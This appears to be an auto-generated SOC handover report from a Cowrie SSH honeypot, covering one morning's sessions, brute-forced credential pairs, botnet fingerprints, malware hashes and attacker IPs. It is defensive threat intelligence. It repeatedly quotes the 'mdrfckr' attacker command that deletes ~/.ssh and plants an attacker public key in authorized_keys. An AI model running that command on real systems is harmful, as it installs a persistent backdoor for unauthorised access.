# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T08:54:45Z |
| **Shift Time** | 08:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **25** |
| Confirmed Threats | **19** |
| False Positives Filtered | **6** (24.0%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **8** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **19** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **14** |
| Unique Usernames | **10** |
| Unique Passwords | **13** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `345gs5662d34` | 3 |
| `test` | 2 |
| `Support` | 1 |
| `config` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `123` | 2 |
| `7` | 1 |
| `qaz123qaz123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `test` | `7` | 1 |
| `root` | `qaz123qaz123` | 1 |
| `Support` | `0987654321` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qaz123qaz123` | `69.5.7.176` | 2026-04-02T07:38:22 |
| `root` | `3245gs5662d34` | `69.5.7.176` | 2026-04-02T07:38:27 |
| `root` | `lol12345` | `112.221.175.214` | 2026-04-02T07:40:45 |
| `root` | `3245gs5662d34` | `112.221.175.214` | 2026-04-02T07:40:49 |
| `root` | `marco` | `103.72.147.99` | 2026-04-02T08:37:03 |
| `root` | `3245gs5662d34` | `103.72.147.99` | 2026-04-02T08:37:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **25** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 10 |
| OpenSSH | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 9 | 9 |
| `03a80b21afa8...` | Modern SSH client | 9 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 9 | 9 | Mirai/variant |
| `03a80b21afa8...` | libssh | 9 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.72.147.99`, `112.221.175.214`, `69.5.7.176`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **17** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | MEDIUM |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f029577aa03

| Field | Detail |
|---|---|
| **Source IP** | `69.5.7[.]176` |
| **First Seen** | 2026-04-02 07:38 |
| **Last Seen** | 2026-04-02 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 07:38:22` | `cowrie.session.connect` |
| `2026-04-02 07:38:22` | `cowrie.client.version` |
| `2026-04-02 07:38:22` | `cowrie.client.kex` |
| `2026-04-02 07:38:22` | `cowrie.login.success` |
| `2026-04-02 07:38:23` | `cowrie.session.params` |
| `2026-04-02 07:38:23` | `cowrie.command.input` |
| `2026-04-02 07:38:23` | `cowrie.command.failed` |
| `2026-04-02 07:38:23` | `cowrie.log.closed` |
| `2026-04-02 07:38:23` | `cowrie.session.params` |
| `2026-04-02 07:38:23` | `cowrie.command.input` |
| `2026-04-02 07:38:24` | `cowrie.session.file_download` |
| `2026-04-02 07:38:24` | `cowrie.log.closed` |
| `2026-04-02 07:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.7[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.5.7[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f67d6723db4a

| Field | Detail |
|---|---|
| **Source IP** | `69.5.7[.]176` |
| **First Seen** | 2026-04-02 07:38 |
| **Last Seen** | 2026-04-02 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 07:38:26` | `cowrie.session.connect` |
| `2026-04-02 07:38:26` | `cowrie.client.version` |
| `2026-04-02 07:38:26` | `cowrie.client.kex` |
| `2026-04-02 07:38:27` | `cowrie.login.success` |
| `2026-04-02 07:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.7[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.5.7[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc78bbae46df

| Field | Detail |
|---|---|
| **Source IP** | `112.221.175[.]214` |
| **First Seen** | 2026-04-02 07:40 |
| **Last Seen** | 2026-04-02 07:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 07:40:45` | `cowrie.session.connect` |
| `2026-04-02 07:40:45` | `cowrie.client.version` |
| `2026-04-02 07:40:45` | `cowrie.client.kex` |
| `2026-04-02 07:40:45` | `cowrie.login.success` |
| `2026-04-02 07:40:46` | `cowrie.session.params` |
| `2026-04-02 07:40:46` | `cowrie.command.input` |
| `2026-04-02 07:40:46` | `cowrie.command.failed` |
| `2026-04-02 07:40:46` | `cowrie.log.closed` |
| `2026-04-02 07:40:46` | `cowrie.session.params` |
| `2026-04-02 07:40:46` | `cowrie.command.input` |
| `2026-04-02 07:40:46` | `cowrie.session.file_download` |
| `2026-04-02 07:40:46` | `cowrie.log.closed` |
| `2026-04-02 07:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.221.175[.]214` to AbuseIPDB if not already reported
- [ ] Block `112.221.175[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e7c0ea067c

| Field | Detail |
|---|---|
| **Source IP** | `112.221.175[.]214` |
| **First Seen** | 2026-04-02 07:40 |
| **Last Seen** | 2026-04-02 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 07:40:48` | `cowrie.session.connect` |
| `2026-04-02 07:40:48` | `cowrie.client.version` |
| `2026-04-02 07:40:48` | `cowrie.client.kex` |
| `2026-04-02 07:40:49` | `cowrie.login.success` |
| `2026-04-02 07:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.221.175[.]214` to AbuseIPDB if not already reported
- [ ] Block `112.221.175[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b607428613

| Field | Detail |
|---|---|
| **Source IP** | `103.72.147[.]99` |
| **First Seen** | 2026-04-02 08:37 |
| **Last Seen** | 2026-04-02 08:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 08:37:02` | `cowrie.session.connect` |
| `2026-04-02 08:37:02` | `cowrie.client.version` |
| `2026-04-02 08:37:02` | `cowrie.client.kex` |
| `2026-04-02 08:37:03` | `cowrie.login.success` |
| `2026-04-02 08:37:03` | `cowrie.session.params` |
| `2026-04-02 08:37:03` | `cowrie.command.input` |
| `2026-04-02 08:37:03` | `cowrie.command.failed` |
| `2026-04-02 08:37:03` | `cowrie.log.closed` |
| `2026-04-02 08:37:03` | `cowrie.session.params` |
| `2026-04-02 08:37:03` | `cowrie.command.input` |
| `2026-04-02 08:37:03` | `cowrie.session.file_download` |
| `2026-04-02 08:37:03` | `cowrie.log.closed` |
| `2026-04-02 08:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.147[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.72.147[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b253a006be2

| Field | Detail |
|---|---|
| **Source IP** | `103.72.147[.]99` |
| **First Seen** | 2026-04-02 08:37 |
| **Last Seen** | 2026-04-02 08:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 08:37:05` | `cowrie.session.connect` |
| `2026-04-02 08:37:05` | `cowrie.client.version` |
| `2026-04-02 08:37:05` | `cowrie.client.kex` |
| `2026-04-02 08:37:06` | `cowrie.login.success` |
| `2026-04-02 08:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.147[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.72.147[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.72.147[.]99` | 1 | 2026-04-02 08:37 | 2026-04-02 08:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.221.175[.]214` | 1 | 2026-04-02 07:40 | 2026-04-02 07:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-04-02 08:21 | 2026-04-02 08:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.86.146[.]178` | 1 | 2026-04-02 08:26 | 2026-04-02 08:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-04-02 07:48 | 2026-04-02 07:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.212.9[.]122` | 1 | 2026-04-02 08:39 | 2026-04-02 08:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.56.157[.]254` | 1 | 2026-04-02 07:16 | 2026-04-02 07:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `179.184.85[.]167` | 1 | 2026-04-02 08:35 | 2026-04-02 08:35 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-04-02 07:42 | 2026-04-02 07:42 | 3s | 0 | `T1592` | 🟢 LOW |
| `20.228.193[.]165` | 1 | 2026-04-02 07:19 | 2026-04-02 07:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.28.237[.]90` | 1 | 2026-04-02 07:39 | 2026-04-02 07:39 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.205[.]197` | 1 | 2026-04-02 07:58 | 2026-04-02 07:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.5.7[.]176` | 1 | 2026-04-02 07:38 | 2026-04-02 07:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.171.11[.]79` | MY | Celcom Axiata Berhad | **100** ⚠️ | 16 |
| `20.228.193[.]165` | US | Microsoft Corporation | **100** ⚠️ | 8 |
| `179.184.85[.]167` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `112.86.146[.]178` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 32 |
| `123.56.157[.]254` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `201.28.237[.]90` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `123.212.9[.]122` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `65.20.205[.]197` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `112.28.73[.]142` | CN | China Mobile Communications Corporation | **100** ⚠️ | 30 |
| `103.72.147[.]99` | HK | Ucloud Hong Kong | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 19 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 12 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 25 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (24.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 13 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T08:54:45Z_
